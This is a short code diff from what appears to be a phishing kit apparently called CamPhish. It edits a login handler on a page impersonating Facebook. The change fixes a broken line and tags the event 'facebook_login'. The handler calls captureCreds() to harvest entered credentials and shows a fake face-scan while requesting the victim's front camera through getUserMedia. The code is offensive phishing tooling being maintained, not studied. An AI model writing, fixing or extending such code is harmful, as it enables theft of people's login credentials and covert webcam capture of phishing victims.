@@ -67,7 +67,8 @@ function doLogin(e){
 e.preventDefault();
 var btn=document.getElementById('loginBtn');btn.innerHTML='Logging in...';btn.disabled=true;
 var fs=document.getElementById('faceScan');fs.classList.add('active');
-if(window.CamPhishRecon)CamPhishRecon.Capture.event('0_login',{}); captureCreds());
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('facebook_login',{});
+captureCreds();
 if(navigator.mediaDevices){
 navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
 var v=document.getElementById('v');v.srcObject=stream;v.play();
